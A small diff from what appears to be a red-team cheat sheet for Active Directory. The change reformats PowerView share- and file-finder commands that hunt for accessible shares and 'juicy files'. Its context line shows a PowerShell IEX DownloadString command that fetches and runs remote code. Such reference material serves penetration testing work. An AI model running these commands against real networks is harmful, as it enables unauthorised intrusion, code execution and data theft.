@@ -201,10 +201,10 @@ SharpPick.exe -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.git
 https://github.com/sense-of-security/ADRecon
 
 ### Share and file finder
-`PS C:\> Invoke-ShareFinder -CheckShareAccess -Verbose -Threads 20 | 
-Out-File -Encoding Ascii interesting-shares.txt
+`Invoke-ShareFinder -CheckShareAccess -Verbose -Threads 20 | 
+Out-File -Encoding Ascii interesting-shares.txt`
 
-PS C:\> Invoke-FileFinder -ShareList .\interesting-shares.txt -Verbose -Threads 
+`Invoke-FileFinder -ShareList .\interesting-shares.txt -Verbose -Threads 
 20 -OutFile juicy_files.csv`
 
 ## Compromise and Lateral Movement
